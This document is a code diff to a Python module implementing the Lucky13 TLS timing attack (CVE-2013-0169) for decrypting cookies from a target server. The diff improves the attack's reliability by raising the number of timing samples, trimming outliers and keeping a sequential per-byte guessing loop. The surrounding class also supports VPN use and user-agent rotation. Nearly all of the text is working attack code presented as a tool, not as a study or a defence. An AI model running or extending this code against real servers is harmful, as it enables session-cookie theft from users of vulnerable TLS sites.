@@ -2,6 +2,7 @@
 Lucky13 attack implementation (CVE-2013-0169).
 
 Exploits timing differences in CBC padding validation to decrypt cookies.
+Uses strict blocking loops and outlier removal to handle network jitter.
 """
 
 import socket
@@ -20,7 +21,8 @@ class Lucky13Attack(BaseAttack):
         super().__init__(target_url, output, vpn, user_agents, rate_limiter, adaptive, quantum)
         self.cookie_name = cookie_name
         self.cookie_value = cookie_value
-        self._num_timing_samples = 5
+        self._num_timing_samples = 10          # increased for better median
+        self._outlier_remove_ratio = 0.05      # drop top and bottom 5%
 
     def _create_tls_context(self) -> ssl.SSLContext:
         ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
@@ -30,7 +32,6 @@ class Lucky13Attack(BaseAttack):
         return ctx
 
     def check_vulnerability(self) -> bool:
-        """Check if server supports TLS 1.2 with CBC ciphers."""
         host = self.target_url.split("://")[1].split("/")[0]
         if ":" in host:
             hostname, port_str = host.split(":")
@@ -48,7 +49,6 @@ class Lucky13Attack(BaseAttack):
             return False
 
     def exploit(self) -> bool:
-        """Full Lucky13 timing attack."""
         self.output.log("Starting Lucky13 attack", "INFO")
         host = self.target_url.split("://")[1].split("/")[0]
         if ":" in host:
@@ -83,13 +83,14 @@ class Lucky13Attack(BaseAttack):
         decrypted_cookie = b""
         known_suffix = b""
 
+        # Blocking sequential loop; no async, no concurrency
         for block_idx in range(len(blocks) - 1, -1, -1):
             block_known = b""
             for byte_offset in range(block_size - 1, -1, -1):
                 full_known_suffix = block_known + known_suffix
                 timings = {}
                 for guess in range(256):
-                    self.rate_limiter.wait()
+                    self.rate_limiter.wait()  # rate limit per request
                     mod_record = self._construct_modified_record(
                         iv, ciphertext, block_idx,
                         guess, full_known_suffix, block_size
@@ -102,6 +103,11 @@ class Lucky13Attack(BaseAttack):
                         if elapsed != float('inf'):
                             samples.append(elapsed)
                     if samples:
+                        # Remove outliers (top and bottom 5%)
+                        if len(samples) > 5:
+                            samples.sort()
+                            drop = int(len(samples) * self._outlier_remove_ratio)
+                            samples = samples[drop:-drop] if drop > 0 else samples
                         timings[guess] = statistics.median(samples)
                     else:
                         timings[guess] = float('inf')
@@ -135,6 +141,7 @@ class Lucky13Attack(BaseAttack):
             )
             return False
 
+    # Helper methods 
     def _capture_request_record(self, hostname: str, port: int,
                                 request: bytes) -> Tuple[bytes, bytes]:
         ctx = self._create_tls_context()
